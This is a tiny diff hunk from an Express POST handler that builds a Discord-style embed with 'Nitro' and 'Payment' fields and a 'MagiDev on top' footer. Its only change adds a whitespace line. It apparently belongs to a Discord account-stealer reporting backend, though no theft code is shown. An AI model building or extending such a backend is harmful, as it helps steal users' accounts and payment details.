@@ -169,6 +169,7 @@ app.post("/", (req, res) => {
                                 { name: 'Nitro', value: `\`${nitros}\``, inline: true },
                                 { name: 'Payment', value: `\`${payments}\``, inline: true }
                             ],
+				
                             color: 5814783,
                             footer: {
                                 "text": "🕊️ MagiDev on top 🕊️",
